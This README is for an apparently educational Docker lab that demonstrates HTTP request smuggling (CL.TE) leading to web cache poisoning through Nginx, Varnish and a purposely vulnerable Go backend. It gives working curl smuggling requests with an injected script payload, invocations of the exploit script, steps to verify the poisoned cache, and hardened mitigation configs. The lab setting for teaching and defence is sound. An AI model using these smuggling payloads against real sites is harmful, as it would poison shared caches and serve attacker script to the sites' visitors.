# HRS-Desynchronization

[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
[![Docker](https://img.shields.io/badge/Docker-Compose-2496ED?logo=docker)](docker-compose.yml)
[![Go](https://img.shields.io/badge/Go-1.22-00ADD8?logo=go)](backend/main.go)
[![Python 3.10+](https://img.shields.io/badge/Python-3.10%2B-3776AB?logo=python)](exploit/attack.py)

An advanced educational laboratory demonstrating **Web Cache Poisoning via CL.TE HTTP Request Smuggling**. The stack mimics a realistic three-tier production pipeline — Nginx → Varnish → a natively-vulnerable Go backend — with integrated packet-level observability via `tcpdump`.

```
Attacker ──► Nginx (frontend-proxy, port 80)
                │  underscores_in_headers on  ← forwards Transfer_Encoding unchanged
                ▼
            Varnish (cache-layer, port 6081)
                │  vcl 4.0  ·  caches .js/.css for 1 h
                │  persistent keep-alive connection to origin
                ▼
            Native Go Backend (backend-origin, port 8000)
                │  honours Transfer_Encoding: chunked
                │  stops reading at 0\r\n\r\n → smuggled bytes stay in socket buffer
                ▼
            tcpdump sidecar → captures/smuggling_trace.pcap
```

---

## 🏗️ Architecture & Desynchronization Pipeline

| Layer | Service | Image | Key Behaviour |
|---|---|---|---|
| Frontend proxy | `frontend-proxy` | `nginx:1.25.5` | HTTP/1.1 reverse proxy; `underscores_in_headers on` lets `Transfer_Encoding` pass through unchanged |
| Cache | `cache-layer` | Alpine 3.5 + Varnish 4.1.9 | VCL 4.0; caches `.js`/`.css` 1 h; keeps a **persistent single connection** to origin |
| Origin | `backend-origin` | Go 1.22 (multi-stage → scratch) | Custom TCP server; detects `Transfer_Encoding: chunked`, stops at `0\r\n\r\n`, ignores `Content-Length` |
| Observability | `network-sniffer` | `nicolaka/netshoot` | `tcpdump` in backend network namespace → `captures/smuggling_trace.pcap` |

### Why This Stack Creates the Vulnerability

1. **Nginx** passes `Transfer_Encoding` (underscore) through to Varnish because `underscores_in_headers on` prevents it from stripping the non-standard header.
2. **Varnish** passes the full POST to the origin without stripping or normalising TE, and maintains a **persistent** backend connection.
3. **The Go backend** detects `Transfer_Encoding: chunked`, reads until `0\r\n\r\n`, and **stops** — leaving the smuggled `GET /reflect?q=<payload>` prefix in the TCP socket buffer.
4. The attacker's trigger `GET /js/app.js` is forwarded by Varnish on that same reused socket. The backend reads the smuggled prefix first, returning the attacker's HTML.
5. Varnish **caches** that HTML response under the `/js/app.js` cache key for 1 hour.

---

## 📁 Repository Layout

```
HRS-Desynchronization/
├── backend/
│   ├── Dockerfile           # Multi-stage Go build → scratch image
│   └── main.go              # Natively-vulnerable custom Go HTTP server
├── captures/                # Auto-generated .pcap files (git-ignored)
├── exploit/
│   └── attack.py            # 4-phase CL.TE cache-poisoning exploit (Python)
├── mitigation/
│   ├── nginx.conf           # Hardened Nginx: rejects dual-length, strips TE, buffers requests
│   └── default.vcl          # Hardened Varnish: strips TE, forces conn:close, no error caching
├── vulnerable_configs/
│   ├── nginx.conf           # Vulnerable Nginx config (reference copy)
│   └── default.vcl          # Vulnerable Varnish VCL (reference copy)
├── nginx/
│   └── nginx.conf           # Active Nginx config (copy from vulnerable_configs/ or mitigation/)
├── varnish/
│   └── default.vcl          # Active Varnish VCL (copy from vulnerable_configs/ or mitigation/)
├── docs/                    # Detailed documentation
│   ├── architecture.md
│   ├── attack-theory.md
│   ├── attack-execution.md
│   ├── mitigation.md
│   └── deployment.md
├── docker-compose.yml       # Full 4-container lab stack
└── pyproject.toml           # Python exploit dependencies (uv)
```

---

## ⚙️ Prerequisites

| Tool | Version | Purpose |
|---|---|---|
| Docker + Compose v2 | Any recent | Running the lab containers |
| Python | 3.10+ | Running the exploit script |
| `uv` | Any | Dependency management |
| `curl` | Any | Manual testing |
| Wireshark | Optional | PCAP analysis of raw traffic |

Install Python exploit dependencies:

```bash
# Install uv (if not already installed)
curl -LsSf https://astral.sh/uv/install.sh | sh

# Install Python dependencies
uv sync
source .venv/bin/activate
# Windows: .venv\Scripts\activate
```

---

## 🚀 Quick Start (Attack Mode)

```bash
# 1. Make sure the VULNERABLE configs are active (they should be by default)
cp vulnerable_configs/nginx.conf nginx/nginx.conf
cp vulnerable_configs/default.vcl varnish/default.vcl

# 2. Build and start the stack
docker compose up --build -d

# 3. Verify all 4 containers are running
docker compose ps

# 4. Sanity-check the stack
curl -i http://localhost/
```

---

## ⚔️ Performing the Attack

You have two options: the automated exploit script, or a step-by-step manual curl replay.

### Option A — Automated exploit (recommended)

```bash
python exploit/attack.py \
  --host localhost \
  --port 80 \
  --target-path "/js/app.js?cb=demo1"
```

Custom payload:

```bash
python exploit/attack.py \
  --host localhost \
  --port 80 \
  --target-path "/js/app.js?cb=demo2" \
  --payload "<script>alert('owned')</script>"
```

> **Tip:** Use a fresh `?cb=` value each run to avoid hitting an already-warm cache.

---

### Option B — Manual curl step-by-step

The following replicates the exact four phases the exploit script performs using raw `curl` commands. Each step must be run sequentially.

#### Step 0 — Baseline check

```bash
# Confirm the stack is alive
curl -i http://localhost/

# Confirm the legitimate JS file looks correct
curl -i "http://localhost/js/app.js?cb=demo1"
# Expected: 200 OK, Content-Type: application/javascript, X-Cache: MISS
```

#### Step 1 — Send the CL.TE smuggling request (plant the smuggled prefix)

This single `curl` sends both the smuggling POST and leaves the connection open (via `--no-buffer` + raw socket pipe trick). The script uses raw sockets for precision; with `curl` you can approximate Phase 1 like this:

```bash
curl -v \
  --http1.1 \
  -X POST \
  -H "Host: localhost" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Content-Length: 153" \
  -H "Transfer_Encoding: chunked" \
  -H "Connection: keep-alive" \
  --data-binary $'6\r\nCLTE=1\r\n0\r\n\r\nGET /reflect?q=%3Cscript%3Ealert%28%27Cache%20Poisoned%21%27%29%3C%2Fscript%3E HTTP/1.1\r\nHost: localhost\r\nContent-Length: 500\r\nX-Ignore: ' \
  http://localhost/reflect
```

Expected response:

```
HTTP/1.1 200 OK
Content-Type: text/html
...

<html><body></body></html>
```

> The backend responded to `/reflect` with no `?q=` because Nginx forwarded the entire body as Content-Length. The **smuggled prefix** (`GET /reflect?q=<payload>`) is now sitting in the backend's socket buffer.

#### Step 2 — Send the trigger GET (on the same TCP connection)

The trigger must arrive on the **same keep-alive connection** as Step 1. With `curl` standalone this is hard to guarantee — the exploit script uses raw sockets. The closest approximation:

```bash
# On the SAME terminal session / connection pipe as Step 1, immediately run:
curl -v \
  --http1.1 \
  -H "Host: localhost" \
  -H "Connection: keep-alive" \
  http://localhost/js/app.js?cb=demo1
```

Expected response: Varnish gets a cache **MISS**, fetches from backend. The backend reads the smuggled `GET /reflect?q=<payload>` prefix from the socket buffer instead of the real request, and the attacker's HTML is returned and **cached** under `/js/app.js?cb=demo1`.

#### Step 3 — Verify the cache is poisoned (fresh connection)

```bash
curl -i "http://localhost/js/app.js?cb=demo1"
```

**Successful poisoning indicators:**

| Header / Field | Expected value |
|---|---|
| `X-Cache` | `HIT` |
| `Content-Type` | `text/html` (not `application/javascript`) |
| `Via` | `1.1 varnish-v4` |
| Body | `<html><body><script>alert('Cache Poisoned!')</script></body></html>` |

> ⚠️ **Note on Step 1+2 ordering:** Because `curl` does not expose raw socket reuse across invocations, the automated `exploit/attack.py` is the reliable way to guarantee Phase 1 and Phase 2 share the same TCP connection. The curl commands above are useful for understanding and inspecting individual phases.

#### Complete Sequence in One Block

```bash
# Reset cache to ensure a clean MISS
docker compose restart cache-layer

# Run the automated exploit with a fresh cache key
python exploit/attack.py \
  --host localhost \
  --port 80 \
  --target-path "/js/app.js?cb=$(date +%s)"

# Manually verify
curl -i "http://localhost/js/app.js?cb=<the cb value you used>"
```

---

## 🔎 Observability (PCAP / Wireshark)

Every time the stack runs, the `network-sniffer` container captures raw traffic between Varnish and the Go backend:

```bash
# Capture is written continuously while the stack is running:
ls -lh captures/smuggling_trace.pcap
```

In Wireshark:

1. Open `captures/smuggling_trace.pcap`.
2. Right-click any HTTP packet → **Follow → TCP Stream**.
3. You will see the chunked terminator `0\r\n\r\n` immediately followed by the smuggled `GET /reflect?q=…` prefix sitting unread in the TCP buffer — proving the boundary dispute.

---

## 🛡️ Applying the Mitigation

The `mitigation/` directory contains hardened drop-in replacements. See [`docs/mitigation.md`](docs/mitigation.md) for full details.

### What the mitigations do

| File | Key Changes |
|---|---|
| `mitigation/nginx.conf` | `underscores_in_headers on` + `map` block that detects dual `Content-Length` + `Transfer-Encoding` → **400 Bad Request**; strips `Transfer-Encoding` before forwarding; enables request buffering; forces `Connection: close` to backend |
| `mitigation/default.vcl` | Rejects dual-length at Varnish edge; strips `Transfer-Encoding` before backend fetch; forces `Connection: close`; never caches 5xx error responses |

### Apply the mitigations

```bash
cp mitigation/nginx.conf nginx/nginx.conf
cp mitigation/default.vcl varnish/default.vcl
docker compose down && docker compose up --build -d
```

### Verify the mitigation works

```bash
# The exploit should now be blocked with HTTP 400
python exploit/attack.py \
  --host localhost \
  --port 80 \
  --target-path "/js/app.js?cb=mit1"
```

Or manually:

```bash
curl -i \
  -X POST \
  -H "Transfer_Encoding: chunked" \
  -H "Content-Length: 153" \
  --data-binary $'6\r\nCLTE=1\r\n0\r\n\r\n' \
  http://localhost/reflect
```

Expected output:

```
HTTP/1.1 400 Bad Request
Content-Type: text/plain
...

Ambiguous request rejected – dual length headers
```

### Restore the vulnerable configuration

```bash
cp vulnerable_configs/nginx.conf nginx/nginx.conf
cp vulnerable_configs/default.vcl varnish/default.vcl
docker compose down && docker compose up --build -d
```

---

## 🧹 Troubleshooting

| Symptom | Cause | Fix |
|---|---|---|
| `[~] Cache HIT but payload not detected` | Cache was already warm for that `?cb=` key | Use a new `?cb=` value or `docker compose restart cache-layer` |
| `[-] Cache poisoning did not produce expected response` | Phase 1 + 2 didn't share the same TCP connection | Use `exploit/attack.py` instead of bare `curl` |
| `503 Backend fetch failed` (cached) | Backend panicked on leftover socket bytes | Restart the backend: `docker compose restart backend-origin` |
| `400 Bad Request` from Phase 1 | Mitigation configs are active | Restore vulnerable configs: `cp vulnerable_configs/* nginx/ && cp vulnerable_configs/default.vcl varnish/` |
| Phase 2 trigger gets no response | Connection closed before trigger arrived | Increase `time.sleep` in `attack.py` Phase 1–2 gap |

---

## 📚 References

- [RFC 7230 § 3.3.3 — Message Body Length](https://datatracker.ietf.org/doc/html/rfc7230#section-3.3.3)
- [PortSwigger Web Security Academy — HTTP Request Smuggling](https://portswigger.net/web-security/request-smuggling)
- [PortSwigger — Web Cache Poisoning](https://portswigger.net/web-security/web-cache-poisoning)
- [James Kettle — HTTP Desync Attacks](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn)

---

## License

MIT. See [LICENSE](LICENSE).